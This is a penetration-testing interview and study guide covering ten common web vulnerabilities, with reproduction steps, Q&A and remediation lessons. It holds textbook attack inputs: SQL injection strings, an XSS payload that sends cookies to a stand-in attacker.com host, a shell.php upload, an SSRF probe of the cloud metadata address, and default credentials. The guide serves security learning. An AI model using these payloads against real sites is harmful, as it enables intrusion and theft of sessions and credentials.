# 🔐 Web VAPT – Top 10 Vulnerabilities (Interview + Practical Guide)

---

# 🔹 PART 1: DETAILED EXPLANATION + REPRODUCTION

## 🔐 1. Authentication Bypass

**What:**
Authentication bypass is a vulnerability where an attacker can access a system without valid credentials.

**How:**
Occurs due to missing server-side validation, weak OTP logic, or trusting client-side checks.

**Impact:**
Full account takeover (user/admin).

**Steps to Reproduce:**

1. Open login page
2. Intercept request using Burp Suite
3. Try invalid login
4. Modify request (remove password / tamper parameters)
5. Observe server response
6. Try direct dashboard access

**Example:**

* Removing password still logs in user
* Response manipulated to `success=true`

---

## 🧾 2. Broken Access Control

**What:**
Users access resources beyond their permissions.

**How:**
Backend fails to enforce role-based access checks.

**Impact:**
Privilege escalation, data leakage.

**Steps:**

1. Login as normal user
2. Capture request
3. Modify endpoint or ID
4. Send request
5. Check unauthorized access

**Example:**
Accessing `/admin/dashboard` as normal user

---

## 🔓 3. IDOR

**What:**
Direct object references are exposed without authorization.

**How:**
Application trusts user input (ID) without validation.

**Impact:**
Access to other users' data.

**Steps:**

1. Login as user
2. Intercept request
3. Identify ID parameter
4. Modify ID
5. Send request

**Example:**
`/invoice?id=1001 → 1002`

---

## 🧑‍💻 4. SQL Injection

**What:**
Injection of malicious SQL queries via input fields.

**How:**
Improper input validation in backend queries.

**Impact:**
Database compromise, login bypass.

**Steps:**

1. Identify input field
2. Inject `' OR 1=1 --`
3. Observe response
4. Test further payloads

**Example:**
Login bypass using:
`admin' OR '1'='1`

---

## 🌐 5. XSS

**What:**
Injection of malicious JavaScript into web pages.

**How:**
No input sanitization before rendering.

**Impact:**
Session theft, phishing.

**Steps:**

1. Find input field
2. Inject `<script>alert(1)</script>`
3. Submit
4. Reload page
5. Observe execution

**Example:**
Popup execution confirms XSS

---

## 🔁 6. CSRF

**What:**
Forces user to perform unintended actions.

**How:**
Missing CSRF token validation.

**Impact:**
Unauthorized actions.

**Steps:**

1. Capture sensitive request
2. Remove CSRF token
3. Replay request
4. Check execution

**Example:**
Password changed without user consent

---

## 📂 7. File Upload

**What:**
Uploading unsafe/malicious files.

**How:**
No validation of file type/content.

**Impact:**
Remote code execution.

**Steps:**

1. Upload normal file
2. Intercept request
3. Change extension to `.php`
4. Access uploaded file

**Example:**
`shell.php` execution

---

## 🌍 8. SSRF

**What:**
Server forced to make internal requests.

**How:**
User-controlled URL input.

**Impact:**
Internal network access.

**Steps:**

1. Find URL input
2. Intercept request
3. Replace URL with `http://localhost`
4. Send request

**Example:**
Access internal admin panel

---

## 🔎 9. Information Disclosure

**What:**
Sensitive data exposed unintentionally.

**How:**
Debug mode, exposed files.

**Impact:**
Credential leakage.

**Steps:**

1. Check source code
2. Access `/robots.txt`, `/.env`
3. Observe responses

**Example:**
`.env` file leak

---

## ⚙️ 10. Security Misconfiguration

**What:**
Improper security settings.

**How:**
Default creds, open directories.

**Impact:**
Easy system compromise.

**Steps:**

1. Try default credentials
2. Check admin panels
3. Analyze headers

**Example:**
Login with `admin/admin`

---

# 🔹 PART 2: RAPID FIRE 

🔐 **1. Authentication Bypass**

**Q: What is authentication bypass?**
👉 It is a vulnerability where an attacker gains access without valid credentials due to broken login logic.

**Q: How does it happen?**
👉 Due to missing server-side validation, weak OTP checks, or trusting client-side logic.

**Q: Impact?**
👉 Unauthorized login to user or admin accounts.

---

## **2. Broken Access Control**

**Q: What is broken access control?**
👉 When users can perform actions or access data beyond their privilege level.

**Q: Example?**
👉 Normal user accessing /admin/dashboard.

**Q: Impact?**
👉 Data leakage and privilege escalation.

---

## **3. IDOR**

**Q: What is IDOR?**
👉 A vulnerability where object references (like IDs) are exposed without authorization checks.

**Q: How to identify?**
👉 Change ID in request and check if other user’s data is accessible.

**Q: Impact?**
👉 Unauthorized access to sensitive user data.

---

## **4. SQL Injection**

**Q: What is SQL Injection?**
👉 Injection of malicious SQL queries into input fields.

**Q: Example payload?**
👉 ' OR 1=1 --

**Q: Impact?**
👉 Database dump, login bypass, data manipulation.

---

## **5. XSS**

**Q: What is XSS?**
👉 Injection of malicious JavaScript into web pages viewed by users.

**Q: Types?**
👉 Stored, Reflected, DOM-based.

**Q: Impact?**
👉 Cookie theft, session hijacking.

---

## **6. CSRF**

**Q: What is CSRF?**
👉 Trick a logged-in user into performing unwanted actions.

**Q: How it works?**
👉 Exploits missing CSRF token validation.

**Q: Impact?**
👉 Unauthorized actions like password/email change.

---

## ** 7. File Upload Vulnerability**

**Q: What is file upload vulnerability?**
👉 When system allows unsafe files to be uploaded without proper validation.

**Q: Risk?**
👉 Upload of malicious scripts (web shells).

**Q: Impact?**
👉 Remote code execution or server compromise.

---

## **8. SSRF**

**Q: What is SSRF?**
👉 Server is tricked into making requests to internal or external systems.

**Q: Example?**
👉 Changing URL input to http://localhost.

**Q: Impact?**
👉 Internal network exposure, cloud metadata access.

---

## **9. Information Disclosure**

**Q: What is information disclosure?**
👉 Sensitive data is exposed unintentionally.

**Q: Examples?**
👉 .env files, debug logs, API keys in frontend.

**Q: Impact?**
👉 Helps attackers plan further attacks.

---

## **10. Security Misconfiguration**

**Q: What is security misconfiguration?**
👉 Improperly configured security settings in application or server.

**Q: Example?**
👉 Default credentials, debug mode ON.

**Q: Impact?**
👉 Easy entry point for attackers.


---

# 🔹 PART 3: REAL-WORLD SCENARIOS

## 🔐 1. Authentication Bypass

** Scenario **  
A startup had OTP-based login for users.

⚔️ Attack  
Attacker intercepted the OTP verification request and noticed:  
• OTP was validated only on frontend  
• Backend accepted request without verifying OTP properly  

They simply skipped OTP validation request and got logged in.

💥 Impact  
Full account takeover without knowing password or OTP.

🎯 Lesson  
👉 Always validate authentication on server side, not frontend.

---

## 🧾 2. Broken Access Control

🧠 Scenario  
An e-learning platform had separate roles: student & admin.

⚔️ Attack  
Attacker logged in as student → captured request → changed endpoint:  
• /user/dashboard → /admin/dashboard  

Backend didn’t verify role.

💥 Impact  
Attacker got admin panel access → could modify courses & users.

🎯 Lesson  
👉 Every request must enforce authorization checks on backend.

---

## 🔓 3. IDOR

🧠 Scenario  
A fintech app allowed users to download invoices.

⚔️ Attack  
URL looked like:  
/invoice?id=1001  

Attacker changed ID:  
1001 → 1002 → 1003  

💥 Impact  
Access to other users’ invoices (financial data leak).

🎯 Lesson  
👉 Never trust direct object references without ownership validation.

---

## 🧑‍💻 4. SQL Injection

🧠 Scenario  
Login form directly used user input in SQL query.

⚔️ Attack  
Attacker entered:  
admin' OR '1'='1  

Query became always true → login bypass.

💥 Impact  
Unauthorized admin access + potential full database dump.

🎯 Lesson  
👉 Use parameterized queries (prepared statements).

---

## 🌐 5. XSS

🧠 Scenario  
A blogging site allowed comments without sanitization.

⚔️ Attack  
Attacker posted:  
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>  

Whenever someone viewed comment → script executed.

💥 Impact  
Session cookies stolen → account hijacking.

🎯 Lesson  
👉 Always sanitize and encode user input before rendering.

## 🔁 6. CSRF (Cross-Site Request Forgery)

🧠 Scenario  
Banking site had no CSRF protection.

⚔️ Attack  
Attacker created malicious page with hidden form:  
• Auto-submits transfer request when user visits page  

Victim (logged in) clicks link → money transferred.

💥 Impact  
Unauthorized financial transaction.

🎯 Lesson  
👉 Use CSRF tokens + SameSite cookies.

---

## 📂 7. File Upload Vulnerability

🧠 Scenario  
Website allowed profile picture upload.

⚔️ Attack  
Attacker uploaded:  
shell.php disguised as image  

Server stored file without validation.  
Then attacker accessed:  
/uploads/shell.php  

💥 Impact  
Remote command execution → full server compromise.

🎯 Lesson  
👉 Validate file type, content, and restrict execution.

---

## 🌍 8. SSRF (Server-Side Request Forgery)

🧠 Scenario  
App allowed users to import images via URL.

⚔️ Attack  
Attacker changed URL to:  
http://169.254.169.254/latest/meta-data  

(Server’s internal cloud metadata endpoint)

💥 Impact  
Leaked cloud credentials → full infrastructure access.

🎯 Lesson  
👉 Restrict internal requests and validate URLs.

---

## 🔎 9. Information Disclosure

🧠 Scenario  
Production server accidentally exposed .env file.

⚔️ Attack  
Attacker accessed:  
website.com/.env  

💥 Impact  
Database credentials, API keys leaked → full system compromise.

🎯 Lesson  
👉 Never expose sensitive files publicly.

---

## ⚙️ 10. Security Misconfiguration

🧠 Scenario  
Admin panel deployed with default credentials.

⚔️ Attack  
Attacker tried:  
admin / admin  

Login successful.

💥 Impact  
Full admin control → data modification, deletion.

🎯 Lesson  
👉 Always change defaults and harden configs.
---

# 🔥 FINAL NOTE

Always test using:

* Burp Suite (Intercept + Repeater)
* Parameter manipulation
* Backend validation checks

---
